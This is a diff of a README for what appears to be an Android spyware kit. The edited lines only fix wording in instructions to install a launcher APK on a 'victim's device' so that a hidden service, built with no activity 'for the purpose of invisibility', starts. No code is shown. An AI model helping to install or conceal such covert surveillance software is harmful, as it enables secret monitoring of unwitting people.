@@ -4,9 +4,9 @@ UPD. 11.02.2016 Version 1.2 released!
 
 DESCRIPTION:
 
-This apk should be installed after service apk on victim's device. It is needed to start the service for the first time cause
-otherwise it wouldn't start (it doesnt have activity for the purpuse of invisibility). You can change either root or regular install.
-After install this apk is no longer needed and may be deleted.
+This apk should be installed right after service apk is installed on victim's device. It is needed to start the service for the first time cause
+otherwise it wouldn't start (it doesnt have activity for the purpose of invisibility). You can change either root or regular install.
+After installation this apk is no longer needed and may be deleted.
 
 HERE ARE LINKS TO THE OTHER COMPONENTS:
 
